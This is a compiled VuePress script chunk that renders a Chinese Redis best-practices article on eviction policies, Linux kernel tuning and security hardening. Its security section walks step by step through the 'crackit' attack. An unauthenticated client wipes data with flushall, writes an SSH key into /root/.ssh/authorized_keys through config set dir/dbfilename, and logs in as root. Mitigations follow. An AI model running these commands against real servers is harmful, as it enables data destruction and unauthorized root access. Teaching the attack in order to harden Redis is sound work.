slot\\\\r\\\\n\"')])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"7\"}},[t(\"li\",[s._v(\"必要情况下使用 monitor 命令时，要注意不要长时间使用\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"客户端优化\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#客户端优化\"}},[s._v(\"#\")]),s._v(\" 客户端优化\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"避免多个应用使用一个 Redis 实例\")])]),s._v(\" \"),t(\"p\",[s._v(\"正例：不相干的业务拆分，公共数据做服务化。\")]),s._v(\" \"),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[t(\"p\",[s._v(\"使用带有连接池的数据库，可以有效控制连接，同时提高效率\")])]),s._v(\" \"),t(\"li\",[t(\"p\",[s._v(\"高并发下建议客户端添加熔断功能(例如 netflix hystrix)\")])]),s._v(\" \"),t(\"li\",[t(\"p\",[s._v(\"设置合理的密码，如有必要可以使用 SSL 加密访问（阿里云 Redis 支持）\")])]),s._v(\" \"),t(\"li\",[t(\"p\",[s._v(\"根据自身业务类型，选好 maxmemory-policy(最大内存淘汰策略)，设置好过期时间\")])])]),s._v(\" \"),t(\"p\",[s._v(\"默认策略是 volatile-lru，即超过最大内存后，在过期键中使用 lru 算法进行 key 的剔除，保证不过期数据不被删除，但是可能会出现 OOM 问题。\")]),s._v(\" \"),t(\"p\",[s._v(\"其他策略如下：\")]),s._v(\" \"),t(\"p\",[s._v(\"allkeys-lru：根据 LRU 算法删除键，不管数据有没有设置超时属性，直到腾出足够空间为止\")]),s._v(\" \"),t(\"p\",[s._v(\"allkeys-random：随机删除所有键，直到腾出足够空间为止\")]),s._v(\" \"),t(\"p\",[s._v(\"volatile-random: 随机删除过期键，直到腾出足够空间为止\")]),s._v(\" \"),t(\"p\",[s._v(\"volatile-ttl：根据键值对象的 ttl 属性，删除最近将要过期数据。如果没有，回退到 noeviction 策略\")]),s._v(\" \"),t(\"p\",[s._v(\"noeviction：不会剔除任何数据，拒绝所有写入操作并返回客户端错误信息”(error) OOM command not allowed when used memory”，此时 Redis 只响应读操作\")]),s._v(\" \"),t(\"h2\",{attrs:{id:\"开发运维\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#开发运维\"}},[s._v(\"#\")]),s._v(\" 开发运维\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"linux-内核优化\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#linux-内核优化\"}},[s._v(\"#\")]),s._v(\" Linux 内核优化\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"vm.overcommit_memory\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cat\")]),s._v(\" /proc/sys/vm/overcommit_memory\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#设置\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v('#echo \"vm.overcommit_memory=1\" >> /etc/sysctl.conf')]),s._v(\"\\nsysctl vm.overcommit_memory\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"=\")]),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\")])]),t(\"ol\",[t(\"li\",[s._v(\"Redis 设置合理的 maxmemory，保证机器有 20%~30%的闲置内存\")]),s._v(\" \"),t(\"li\",[s._v(\"集中化管理 AOF 重写和 RDB 的 bgsave\")]),s._v(\" \"),t(\"li\",[s._v(\"设置 vm.overcommit_memory=1，防止极端情况下会造成 fork 失败\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"swappiness\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#立即生效\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"echo\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"{\")]),s._v(\"bestvalue\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"}\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">\")]),s._v(\" /proc/sys/vm/swappiness\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#永久生效\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"echo\")]),s._v(\" vm.swappiness\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"=\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"{\")]),s._v(\"bestvalue\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"}\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">>\")]),s._v(\" /etc/sysctl.conf\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\")])]),t(\"p\",[s._v(\"如果 Linux>3.5， vm.swappiness=1，否则 vm.swappiness=0，从而实现如下两个目标：\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"物理内存充足时候，使 Redis 足够快\")]),s._v(\" \"),t(\"li\",[s._v(\"物理内存不足时候，避免 Redis 死掉(如果当前 Redis 为高可用，死掉比阻塞更好)\")]),s._v(\" \"),t(\"li\",[s._v(\"THP(Transparent huge page)\")])]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"作用加速 fork\")]),s._v(\" \"),t(\"li\",[s._v(\"建议：禁用，可能产生更大的内存开销\")]),s._v(\" \"),t(\"li\",[s._v(\"坑：源码中是绝对路径，注意不同发行版本的区别\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"echo\")]),s._v(\" never \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">\")]),s._v(\" /sys/kernel/mm/transparent_hugepage/enabled\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"OOM killer\")])]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"作用：内存使用溢出，操作系统按照规则 kill 掉某些进程\")]),s._v(\" \"),t(\"li\",[s._v(\"配置方法：/proc/{progress_id}/oom_adj 越小，被杀掉概率越小\")]),s._v(\" \"),t(\"li\",[s._v(\"运维经验：不要过度依赖此特性，应该合理管理内存\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[t(\"p\",[s._v(\"NTP(Net Time Protocol)\\n对时\")])]),s._v(\" \"),t(\"li\",[t(\"p\",[s._v(\"ulimit\")])]),s._v(\" \"),t(\"li\",[t(\"p\",[s._v(\"TCP backlog\")])])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cat\")]),s._v(\" /proc/sys/net/core/somaxconn\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"echo\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"511\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">\")]),s._v(\" /proc/sys/net/core/somaxconn\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"安全\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#安全\"}},[s._v(\"#\")]),s._v(\" 安全\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"redis-crackit-漏洞\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redis-crackit-漏洞\"}},[s._v(\"#\")]),s._v(\" Redis crackit 漏洞\")]),s._v(\" \"),t(\"p\",[s._v(\"参考：\"),t(\"a\",{attrs:{href:\"https://www.aneasystone.com/archives/2015/11/redis-crackit.html\",target:\"_blank\",rel:\"noopener noreferrer\"}},[s._v(\"https://www.aneasystone.com/archives/2015/11/redis-crackit.html\"),t(\"OutboundLink\")],1)]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"首先确认当前(攻击前)机器 A 不能通过 ssh 访问机器 B，因为没有权限\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"ssh\")]),s._v(\" root@192.168.153.130\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"由于机器 B 的外网对外开题了 Redis 的 6379 端口，所以可以直接连接到 Redis 上执行 flushall 操作，注意此时破坏性已经很大了\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"redis-cli -h \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"192.168\")]),s._v(\".153.130 -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"6379\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"ping\")]),s._v(\"\\nredis-cli -h \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"192.168\")]),s._v(\".153.130 -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"6379\")]),s._v(\" flushall\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"3\"}},[t(\"li\",[s._v(\"在机器 A 生成公钥，并将公钥保存到一个文件 my.pub 中\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"ssh-keygen -t rsa\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"(\")]),s._v(\"echo -e \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"'),t(\"span\",{pre:!0,attrs:{class:\"token entity\",title:\"\\\\n\"}},[s._v(\"\\\\n\")]),t(\"span\",{pre:!0,attrs:{class:\"token entity\",title:\"\\\\n\"}},[s._v(\"\\\\n\")]),s._v('\"')]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\";\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cat\")]),s._v(\" id_rsa.pub\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\";\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"echo\")]),s._v(\" -e \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"'),t(\"span\",{pre:!0,attrs:{class:\"token entity\",title:\"\\\\n\"}},[s._v(\"\\\\n\")]),t(\"span\",{pre:!0,attrs:{class:\"token entity\",title:\"\\\\n\"}},[s._v(\"\\\\n\")]),s._v('\"')]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\")\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">\")]),s._v(\" my.pub\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"4\"}},[t(\"li\",[s._v(\"将公钥作为 value 添加到 Redis 中\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cat\")]),s._v(\" my.pub \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\" redis-cli -h \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"192.168\")]),s._v(\".153.130 -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"6379\")]),s._v(\" -x \"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" crackit\\nredis-cli -h \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"192.168\")]),s._v(\".153.130 -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"6379\")]),s._v(\" get crackit\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"5\"}},[t(\"li\",[s._v(\"将 Redis 的 dir 设置为 /root/.ssh/目录，dbfilename 设置为 authorized_keys\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"config \"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"dir\")]),s._v(\" /root/.ssh/\\nconfig \"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" dbfilename authorized_keys\\nsave\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"6\"}},[t(\"li\",[s._v(\"此时再次通过 ssh 协议访问机器 B，发现顺利登陆\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"ssh\")]),s._v(\" root@192.168.153.130\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"p\",[s._v(\"登陆后可以观察/root/.ssh/authorized_keys，可以发现它就是 RDB 文件\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cat\")]),s._v(\" /root/.ssh/authorized_keys\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"安全法则\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#安全法则\"}},[s._v(\"#\")]),s._v(\" 安全法则\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"设置密码\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"服务端配置：requirepass 和 masterauth\")]),s._v(\" \"),t(\"li\",[s._v(\"客户端连接：auth 命令和-a 参数\")]),s._v(\" \"),t(\"li\",[s._v(\"相关建议：\\n\"),t(\"ul\",[t(\"li\",[s._v(\"密码要足够复杂，防止暴力破解\")]),s._v(\" \"),t(\"li\",[s._v(\"masterauth 不要忘记\")]),s._v(\" \"),t(\"li\",[s._v(\"auth 还是通过明文传输\")])])])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"伪装危险命令\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"服务端配置：rename-command 为空或者随机字符\")]),s._v(\" \"),t(\"li\",[s._v(\"客户端连接：不可用或者使用指定随机字符\")]),s._v(\" \"),t(\"li\",[s._v(\"相关建议：\\n\"),t(\"ul\",[t(\"li\",[s._v(\"不支持 config set 动态设置\")]),s._v(\" \"),t(\"li\",[s._v(\"RDB 和 AOF 如果包含 rename-command 之前的命令，将无法使用\")]),s._v(\" \"),t(\"li\",[s._v(\"rename-command 命令本身是在 Redis 内核会使用到，不建议设置\")])])])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"3\"}},[t(\"li\",[s._v(\"bind\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"服务端配置：bind 限制的是网卡，并不是客户端 ip\")]),s._v(\" \"),t(\"li\",[s._v(\"相关建议：\\n\"),t(\"ul\",[t(\"li\",[s._v(\"bind 不支持 config set\")]),s._v(\" \"),t(\"li\",[s._v(\"bind 127.0.0.1 需要谨慎\")]),s._v(\" \"),t(\"li\",[s._v(\"如果存在外网网卡尽量屏蔽掉\")])])])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"4\"}},[t(\"li\",[s._v(\"防火墙\")]),s._v(\" \"),t(\"li\",[s._v(\"定期备份\")]),s._v(\" \"),t(\"li\",[s._v(\"不使用默认端口，防止被弱攻击杀掉\")]),s._v(\" \"),t(\"li\",[s._v(\"使用非 root 用户启动\")])])])}),[],!1,null,null,null);a.default=n.exports}}]);","extractedComments":[]}